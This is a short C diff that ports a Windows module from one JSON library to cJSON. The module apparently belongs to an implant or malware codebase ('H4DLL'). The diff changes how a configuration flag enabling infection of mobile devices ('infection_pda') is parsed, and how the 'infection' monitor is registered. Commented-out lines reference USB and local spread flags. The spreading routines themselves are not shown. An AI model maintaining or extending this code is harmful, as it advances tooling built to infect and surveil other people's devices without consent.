@@ -2,7 +2,7 @@
 
 #include <Windows.h>
 #include <stdio.h>
-#include <json/JSON.h>
+#include <cJSON/cJSON.h>
 #include "../../H4DLL/common.h"
 #include "../../H4DLL/H4-DLL.h"
 #include "../../H4DLL/LOG.h"
@@ -1289,12 +1289,13 @@ DWORD WINAPI PM_PDAAgentStartStop(BOOL bStartFlag, BOOL bReset)
 	return 1;
 }
 
-DWORD WINAPI PM_PDAAgentInit(JSONObject elem)
+DWORD WINAPI PM_PDAAgentInit(cJSON* elem)
 {
 	//DWORD temp;
 
+	cJSON* mobile = cJSON_GetObjectItem(elem, "mobile");
 	//infection_spread = (BOOL) elem[L"local"]->AsBool();
-	infection_pda = (BOOL)elem[L"mobile"]->AsBool();
+	infection_pda = (BOOL)cJSON_IsTrue(mobile);
 	//infection_usb = (BOOL) elem[L"usb"]->AsBool();
 
 /*	temp = (DWORD) elem[L"vm"]->AsNumber();
@@ -1310,6 +1311,6 @@ DWORD WINAPI PM_PDAAgentInit(JSONObject elem)
 
 void PM_PDAAgentRegister()
 {
-	AM_MonitorRegister(L"infection", PM_PDAAGENT, NULL, (BYTE*)PM_PDAAgentStartStop, (BYTE*)PM_PDAAgentInit, NULL);
+	AM_MonitorRegister("infection", PM_PDAAGENT, NULL, (BYTE*)PM_PDAAgentStartStop, (BYTE*)PM_PDAAgentInit, NULL);
 }
 
